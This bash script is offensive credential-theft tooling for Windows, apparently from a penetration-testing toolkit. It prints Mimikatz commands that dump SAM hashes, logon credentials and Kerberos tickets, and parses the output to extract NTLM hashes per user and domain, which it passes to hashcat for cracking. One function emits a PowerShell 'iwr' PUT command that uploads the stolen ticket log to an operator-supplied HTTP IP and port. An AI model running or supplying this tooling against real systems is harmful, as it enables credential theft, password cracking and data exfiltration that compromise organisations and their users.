#!/bin/bash

get_ntlm_hash_from_mimikatz_log_lsadump_sam() {

    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running Mimikatz."
        return 1
    fi
    if [[ ! -f "$mimikatz_log" ]] || [[ ! -s "$mimikatz_log" ]]; then
        echo "Mimikatz log file $mimikatz_log not found or empty."
        return 1
    fi    
    echo "Extracting NTLM hash for user $target_username from $mimikatz_log..."
    ntlm_hash=$(awk '
        /User : '"$target_username"'/ {
            if (getline > 0 && /NTLM/) {
                print $3;
            }
        }
    ' "$mimikatz_log")
    echo "ntlm_hash: $ntlm_hash"
}

run_mimikatz_lsadump_sam() {

    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log="mimikatz_lsadump_sam.log"
    fi
    echo "Running Mimikatz to dump SAM and LSADump..."
    echo '.\mimikatz.exe "privilege::debug" "token:elevate" "lsadump::sam" exit > $mimikatz_log'
    upload_file "$mimikatz_log"
    if ! get_ntlm_hash_from_mimikatz_log_lsadump_sam; then
        echo "Failed to extract NTLM hash from Mimikatz log."
        return 1
    fi
    if [[ -z "$ntlm_hash" ]]; then
        echo "NTLM hash for user $target_username not found in Mimikatz log."
        return 1
    fi
    echo "$ntlm_hash" > "hashes.$target_username"
    hash_file="hashes.$target_username"
    hashcat_ntlm
}

run_mimikatz_kbtickets() {
    local unc_path="$1"
    if [ -z "$unc_path" ]; then
        echo "UNC path is required for running mimikatz kbtickets."
        exit 1
    fi
    if [[ -z "$mimiktaz_log" ]]; then
        mimikatz_log="mimikatz_kbtickets.log"
    fi
    if [[ -z "$http_ip" ]] || [[ -z "$http_port" ]]; then
        echo "HTTP IP address and port must be set before running mimikatz kbtickets."
        return 1
    fi
    echo '.\mimikatz.exe "privilege::debug" exit;'
    echo 'dir '"$unc_path"';'
    echo '.\mimikatz.exe "sekurlsa::tickets" exit > '"$mimikatz_log"';'
    echo 'iwr -Uri http://'"$http_ip"':'"$http_port"'/'"$mimikatz_log"' -Infile '"$mimikatz_log"' -Method Put;'
}

run_mimikatz_export_tickets() {
    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit;'
}

get_ntlm_hash_from_mimikatz_log_logonpasswords() {
    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log="mimikatz_logonpasswords.log"
    fi
    if [[ ! -f "$mimikatz_log" ]]; then
        echo "$mimikatz_log not found, cannot extract NTLM hash"
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running."
        return 1
    fi
    if [[ -z "$target_domain" ]]; then
        echo "Target domain must be set before running."
        return 1       
    fi
    sudo dos2unix "$mimikatz_log" >> /dev/null 2>&1
    ntlm_hash=$(awk '
        /'"$target_username"'/ {
            if (getline > 0 && /'"$target_domain"'/) {            
                if (getline > 0 && /NTLM/) {
                    print $4
                }
            }
        }
    ' "$mimikatz_log" | head -n 1)
    write_ntlm_hash_to_file
    echo "$ntlm_hash"
}



get_ntlm_hash_from_mimikatz_log_lsadump() {
    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log="mimikatz_lsadump.log"
    fi
    if [[ ! -f "$mimikatz_log" ]]; then
        echo "$mimikatz_log not found, cannot extract NTLM hash"
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running."
        return 1
    fi
    sudo dos2unix "$mimikatz_log" >> /dev/null 2>&1
    domain_sid=$(cat "$mimikatz_log" | grep -oP 'Domain.*/ \K.*')
    ntlm_hash=$(awk '
        /User : '"$target_username"'/ {
            if (getline > 0 && /LM/) {
                if (getline > 0 && /NTLM/) {
                    print $3
                }
            }
        }
    ' "$mimikatz_log" )
    write_ntlm_hash_to_file
    echo "$ntlm_hash"

}

write_ntlm_hash_to_file() {
    if [[ -z "$ntlm_hash" ]]; then
        echo "NTLM hash is not set, cannot write to file." >> $trail_log
        return 1
    fi

    if [[ ! -z "$target_username" ]]; then
        if [[ ! -z "$target_domain" ]]; then
            hash_file="hashes.$target_domain.$target_username"
        else
            hash_file="hashes.$target_username"
        fi
    fi
    if [[ -f "$hash_file" ]]; then
        echo "$hash_file already exists, skipping writing NTLM hash." >> $trail_log
        return 0
    fi
    echo "$ntlm_hash" > "$hash_file"
}

